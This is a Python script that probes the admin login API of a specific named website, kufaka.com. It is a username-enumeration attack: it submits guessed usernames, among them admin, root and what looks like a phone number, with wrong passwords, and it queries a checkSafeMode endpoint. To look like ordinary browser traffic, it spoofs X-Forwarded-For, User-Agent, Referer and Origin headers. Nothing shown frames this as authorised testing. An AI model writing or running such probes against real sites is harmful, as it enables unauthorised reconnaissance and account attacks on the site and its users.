import json, urllib.request, urllib.error

BASE = "https://www.kufaka.com/adminApi"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def post(path, obj, xff="10.11.12.13"):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", xff)
    req.add_header("User-Agent", UA)
    req.add_header("Referer", "https://www.kufaka.com/package/admin/")
    req.add_header("Origin", "https://www.kufaka.com")
    try:
        r = urllib.request.urlopen(req, timeout=25)
        return (r.status, r.read().decode("utf-8", "ignore")[:250])
    except urllib.error.HTTPError as e:
        return (e.code, e.read().decode("utf-8", "ignore")[:250])
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__)

print("=== login oracle test (existing vs nonexistent username) ===")
for u in ["admin", "administrator", "root", "firstwxx", "firstwxx1", "19022075515", "zzz_nonexist_9f3k0", ""]:
    print(repr(u), post("/auth/login", {"username": u, "password": "WRONGPASS_zzz_%d" % len(u)}))

print("=== checkSafeMode ===")
for u in ["admin", "zzz_nonexist_9f3k0", ""]:
    print(repr(u), post("/auth/checkSafeMode", {"username": u}))
print("DONE")
